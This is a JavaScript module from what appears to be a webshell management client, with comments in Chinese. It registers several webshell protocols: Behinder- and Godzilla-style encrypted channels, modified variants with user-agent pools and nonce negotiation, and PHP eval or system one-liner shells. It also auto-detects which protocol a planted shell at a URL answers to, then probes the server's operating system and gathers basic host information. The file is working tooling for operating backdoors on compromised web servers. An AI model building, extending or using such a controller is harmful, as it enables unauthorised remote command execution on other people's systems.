// dsh-webshell-mgr 协议注册表 + 连接自动识别。
// 识别顺序（自研优先，越靠后越是存量生态）：
//   dsh-aes → cmd-eval(PHP) → cmd-system → behinder-mod → godzilla-mod
//   （原生冰蝎/哥斯拉兼容注册位预留，P2 落地后插入队尾）
// 命中后统一跑 OS 探测 + 基本信息，回填连接字段。

import * as aes from "./dsh-aes.js";
import * as cmdc from "./cmd.js";
import * as bmod from "./behinder-mod.js";
import * as gmod from "./godzilla-mod.js";
import * as behinder from "./behinder.js";
import * as godzilla from "./godzilla.js";
import { runCommand, osOf, basicInfo } from "./capabilities.js";
import { parseOsProbe } from "./command-build.js";

export const REGISTRY = {
	"behinder": {
		id: "behinder",
		label: "冰蝎型通道（AES-ECB）",
		langs: ["php"],
		caps: { cmd: true, code: true, b64rw: false },
		fields: ["password", "encoding"],
		note: "key=md5(密码)[0:16]；桥接载荷提供完整 eval 能力（结构化文件/数据库可用）。"
	},
	"godzilla": {
		id: "godzilla",
		label: "哥斯拉型通道（PHP_XOR_BASE64）",
		langs: ["php"],
		caps: { cmd: true, code: true, b64rw: false },
		fields: ["password", "secret_key", "encoding"],
		note: "password=POST 参数名，secret_key=密钥源（key=md5(secretKey)[0:16]）；桥接载荷同上。"
	},
	"cmd-system": {
		id: "cmd-system",
		label: "一句话（命令通道）",
		langs: ["php", "jsp", "aspx"],
		caps: { cmd: true, code: false, b64rw: false },
		fields: ["pass_param", "cmd_param", "password", "method", "encoding"],
		note: "口令门 + 命令参数马；文件/数据库走命令翻译。"
	},
	"cmd-eval": {
		id: "cmd-eval",
		label: "一句话（eval 通道）",
		langs: ["php"],
		caps: { cmd: true, code: true, b64rw: false },
		fields: ["pass_param", "password", "method", "encoding"],
		note: "eval($_POST[x]) 形马（含蚁剑默认马语义）；结构化操作走 PHP 片段。"
	},
	"dsh-aes": {
		id: "dsh-aes",
		label: "自研加密通道",
		langs: ["php", "jsp", "aspx"],
		caps: { cmd: true, code: "v2", b64rw: true },
		fields: ["encoding"],
		note: "X-T 头密钥 + AES-128-CBC + c/u/d(/e) 操作码；v2 马带 eval 能力。"
	},
	"behinder-mod": {
		id: "behinder-mod",
		label: "魔改冰蝎型通道",
		langs: ["php"],
		caps: { cmd: true, code: false, b64rw: false },
		fields: ["password", "secret_key", "encoding"],
		note: "UA 池 + X-T 会话 + nonce 协商 + CTR 分块异或回传；password=X-T 值，secret_key=盐。"
	},
	"godzilla-mod": {
		id: "godzilla-mod",
		label: "魔改哥斯拉型通道",
		langs: ["php"],
		caps: { cmd: true, code: false, b64rw: false },
		fields: ["password", "secret_key", "encoding"],
		note: "X-G 头派生 ECB + sid 通行证 + md5 前缀 XOR 回传；password=X-G 值，secret_key=盐。"
	}
};

/** 元信息（UI 选择器用）。 */
export function protocolMeta() {
	return Object.values(REGISTRY).map(({ id, label, langs, caps, fields, note }) => ({ id, label, langs, caps, fields, note }));
}

const DETECT_ORDER = ["dsh-aes", "cmd-eval", "cmd-system", "behinder", "godzilla", "behinder-mod", "godzilla-mod"];

/**
 * 协议自动识别：给定 url + 凭据逐个探测。
 * @returns {Promise<{hit:boolean, protocol?, shellLang?, execMode?, os?, basicInfo?, attempts:object[]}>}
 */
export async function detectProtocol(spec) {
	const attempts = [];
	const conn = {
		id: "detect",
		url: String(spec.url ?? "").trim(),
		password: String(spec.password ?? ""),
		secret_key: String(spec.secretKey ?? ""),
		pass_param: String(spec.passParam ?? "pass") || "pass",
		cmd_param: String(spec.cmdParam ?? "cmd") || "cmd",
		method: spec.method === "get" ? "get" : "post",
		encoding: "auto",
		timeoutMs: Math.min(Number(spec.timeoutMs) || 8000, 15000),
		headers: {}
	};
	if (!conn.url) return { hit: false, error: "url 不能为空", attempts };

	const probeOne = async (protocol) => {
		try {
			if (protocol === "dsh-aes") return await aes.probe(conn);
			if (protocol === "cmd-eval") return await cmdc.probeEvalPhp(conn);
			if (protocol === "cmd-system") return await cmdc.probeSystem(conn);
			if (protocol === "behinder") return await behinder.probe(conn);
			if (protocol === "godzilla") return await godzilla.probe(conn);
			if (protocol === "behinder-mod") return await bmod.probe(conn);
			if (protocol === "godzilla-mod") return await gmod.probe(conn);
		} catch (e) {
			attempts.push({ protocol, error: String(e?.message ?? e) });
			return null;
		}
		return null;
	};

	for (const protocol of DETECT_ORDER) {
		const r = await probeOne(protocol);
		if (!r) { if (!attempts.some((a) => a.protocol === protocol)) attempts.push({ protocol, error: "无 token 回显" }); continue; }
		// 命中：OS + 基本信息
		const found = { ...conn, protocol };
		if (protocol === "cmd-system") found.exec_mode = "system";
		if (protocol === "cmd-eval") { found.exec_mode = "eval"; found.shell_lang = "php"; }
		if (protocol === "behinder-mod" || protocol === "godzilla-mod") found.shell_lang = "php";
		let os = null;
		let info = null;
		try {
			os = await osOf(found);
		} catch { /* OS 探测失败不阻断连接登记 */ }
		try {
			info = await basicInfo(found);
			if (!os && info?.os) os = info.os;
		} catch { /* 基本信息失败不阻断 */ }
		return {
			hit: true,
			protocol,
			shellLang: found.shell_lang ?? "php",
			execMode: found.exec_mode ?? "",
			os: os ?? "auto",
			basicInfo: info,
			attempts
		};
	}
	return { hit: false, error: "全部通道探测未命中——检查 URL/口令/盐与马类型是否匹配", attempts };
}

/** 连接探活（已登记连接的刷新）。 */
export async function probeConnection(conn) {
	const osProbe = await runCommand(conn, "echo :WSMPROBE-%OS%-END:");
	const os = parseOsProbe(osProbe);
	const info = await basicInfo(conn).catch(() => null);
	return { status: "ok", os: os ?? (info?.os ?? "auto"), basicInfo: info };
}

export { REGISTRY as default };
